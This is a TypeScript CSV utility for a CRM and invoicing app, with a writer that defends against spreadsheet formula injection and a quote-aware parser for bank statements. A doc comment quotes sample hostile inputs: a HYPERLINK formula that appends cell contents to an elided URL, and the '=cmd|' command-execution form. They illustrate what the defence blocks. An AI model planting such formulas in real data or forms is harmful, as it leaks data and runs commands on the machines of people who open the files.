/**
 * Writing a spreadsheet somebody else can open.
 *
 * A CSV looks like joining strings with commas until a customer is called
 * "Smith, Jones & Co" or an address has a line break in it, at which point the
 * file is silently wrong from that row down and nobody notices until a column
 * of phone numbers turns out to hold names.
 *
 * Here rather than in one module because three of them export now — the CRM's
 * contacts, companies and deals, and Invoicing's documents and price list —
 * and a second implementation is a second set of quoting rules to get right.
 */

/**
 * A cell a spreadsheet will run instead of read.
 *
 * Excel, LibreOffice and Google Sheets all treat a cell beginning `=`, `+`,
 * `-`, `@`, tab or carriage return as a formula. That is a quoting problem
 * until you notice where these rows come from: **the CRM's contacts are fed
 * by a form embedded on the business's public website**, which anybody on the
 * internet can fill in. A visitor who gives their name as
 * `=HYPERLINK("http://…"&A1,"Invoice")` has written a formula into the
 * business's own export, and it runs the moment somebody double-clicks the
 * file. The older `=cmd|…` form asks the operating system.
 *
 * A leading apostrophe is the standard answer: Excel drops it and shows the
 * text, and nothing is executed. **Except for a number**, which is checked
 * for first — a ledger export full of `'-1234.56` is a column that no longer
 * adds up, and negative money is the ordinary case in a bookkeeping product.
 * A phone number like `+44 1248 555 0123` is not a number to this test and is
 * quoted, which is also what stops a spreadsheet mangling it.
 */
function formulaSafe(text: string): string {
  if (!/^[=+\-@\t\r]/.test(text)) return text;
  // A plain number keeps its sign and stays a number.
  if (/^-?\d+(\.\d+)?$/.test(text)) return text;
  return `'${text}`;
}

import { contentDisposition } from "./attachments";

function field(value: unknown): string {
  if (value === null || value === undefined) return "";
  const text = formulaSafe(String(value));
  return /[",\n\r]/.test(text) ? `"${text.replaceAll('"', '""')}"` : text;
}

export function toCsv(headers: string[], rows: unknown[][]): string {
  const lines = [headers.map(field).join(",")];
  for (const row of rows) lines.push(row.map(field).join(","));
  // CRLF, because Excel treats a bare newline as part of the field on some
  // platforms and the file opens as one long row.
  return `${lines.join("\r\n")}\r\n`;
}

/** The headers a browser needs to save it rather than display it. */
export function csvDownload(filename: string): Record<string, string> {
  return {
    "content-type": "text/csv; charset=utf-8",
    // The helper beside it, not a quote of its own. Every filename handed to
    // this one today is a constant, and the next one will not be.
    "content-disposition": contentDisposition("attachment", filename),
  };
}

/**
 * Splits a CSV file into rows of cells, honouring quotes and embedded commas.
 *
 * Written for bank statements, which is why it is this careful: every bank
 * exports CSV slightly differently, with quoted fields containing commas and
 * doubled quotes inside them. It is here rather than in one module because
 * three of them read a spreadsheet somebody else produced — a bank's, a
 * mailing list's, a shop's — and two parsers is two sets of quoting bugs.
 */
export function parseCsv(text: string): string[][] {
  const rows: string[][] = [];
  let row: string[] = [];
  let cell = "";
  let quoted = false;

  for (let i = 0; i < text.length; i += 1) {
    const char = text[i];
    if (quoted) {
      if (char === '"') {
        // A doubled quote inside a quoted field is a literal quote.
        if (text[i + 1] === '"') {
          cell += '"';
          i += 1;
        } else {
          quoted = false;
        }
      } else {
        cell += char;
      }
      continue;
    }
    if (char === '"') {
      quoted = true;
    } else if (char === ",") {
      row.push(cell);
      cell = "";
    } else if (char === "\n") {
      row.push(cell);
      rows.push(row);
      row = [];
      cell = "";
    } else if (char !== "\r") {
      cell += char;
    }
  }
  if (cell !== "" || row.length > 0) {
    row.push(cell);
    rows.push(row);
  }
  return rows;
}
